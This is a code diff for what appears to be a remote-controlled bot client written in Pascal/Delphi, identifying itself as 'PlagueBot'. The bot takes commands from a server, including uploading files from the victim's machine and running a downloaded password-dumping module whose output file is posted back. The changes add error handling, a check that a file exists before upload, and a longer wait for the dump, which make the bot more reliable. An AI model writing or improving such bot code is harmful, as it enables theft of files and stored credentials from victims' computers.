@@ -182,6 +182,7 @@ Begin
   Hat.Request.Connection:='keep-alive';
   Hat.Request.UserAgent:='PlagueBot';
   ToPost:=TIdMultipartFormDataStream.Create;
+  try
   Case Net.Commands.ReadString(FCmdID, 'Type', '') of
     'Register': Begin
       ToPost.AddFormField('RT', '3');
@@ -240,8 +241,13 @@ Begin
       Halt(0);
     end;
     'Upload': Begin
-      ToPost.AddFormField('RT', '2');
-      ToPost.AddFile('File', Net.Commands.ReadString(FCmdID, 'FileName', ''));
+      if FileExists(Net.Commands.ReadString(FCmdID, 'FileName', '')) then Begin
+        ToPost.AddFormField('RT', '2');
+        ToPost.AddFile('File', Net.Commands.ReadString(FCmdID, 'FileName', ''));
+      end else Begin
+        ToPost.AddFormField('RT', '1');
+        ToPost.AddFormField('Result', 'The specified file does not exist.');
+      end;
       DoPost;
     end;
     'Download': Begin
@@ -438,7 +444,7 @@ Begin
       Error:=True; //Not feeling too positive today
       ModID:=ExecuteModule(Server+PassModule, '/shtml P.html');
       if ModID>0 then Begin
-        Sleep(5000);
+        Sleep(7000);
         if FileExists('P.html') then Begin
           Error:=False;
           ToPost.AddFormField('RT', '2');
@@ -479,6 +485,10 @@ Begin
       ToPost.AddFormField('RT', '1');
       ToPost.AddFormField('Result', 'Unknown command!');
       DoPost;
+    end;
+  end;
+  except
+    on E: Exception do Begin
     end;
   end;
   Writeln('Thread [',FIndex,'] exited.');
